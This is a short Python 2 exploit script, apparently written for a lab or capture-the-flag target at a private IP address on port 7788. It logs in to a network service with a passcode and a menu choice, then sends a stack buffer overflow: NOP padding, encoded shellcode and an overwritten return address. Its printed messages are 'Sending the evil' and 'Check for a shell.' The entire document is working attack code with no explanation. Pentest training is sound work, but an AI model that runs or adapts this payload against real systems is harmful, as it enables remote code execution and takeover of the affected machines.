#!/usr/bin/python
import socket
host = "192.168.159.142"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, 7788))
s.recv(1024)
s.send("48093572\n")
s.recv(1024)
s.send("3\n")
s.recv(1024)
pad = "\x90" * (168-98)
ret = "\x63\x85\x04\x08\n"
buf =  ""
buf += "\xd9\xea\xd9\x74\x24\xf4\x5b\xbf\x18\x53\xaa\xcb\x29"
buf += "\xc9\xb1\x12\x83\xeb\xfc\x31\x7b\x16\x03\x7b\x16\xe2"
buf += "\xed\x62\x71\x3c\xee\xd6\xc6\x90\x9a\xda\x78\x70\xd3"
buf += "\x3a\xb5\xfd\x74\xe7\x2e\x3e\xd2\x87\x22\xd6\x20\xb8"
buf += "\x2c\xc6\xad\x59\x26\x6e\xf5\xc9\xe6\x39\x8c\x0b\x4b"
buf += "\x0b\x0e\x79\x4b\x2a\x0e\x6e\x54\x4c\x87\x6d\x95\xa7"
buf += "\x9b\xb0\xf5\x34\x13\x4f\x37\xc4\x08\x39\x26\x5c\x18"
buf += "\x35\x19\x5c\xa9\xc6\xa6\x82"
buffer = pad + buf + ret
print "Sending the evil"
s.send(buffer)
s.recv(1024)
s.close
print "Check for a shell."
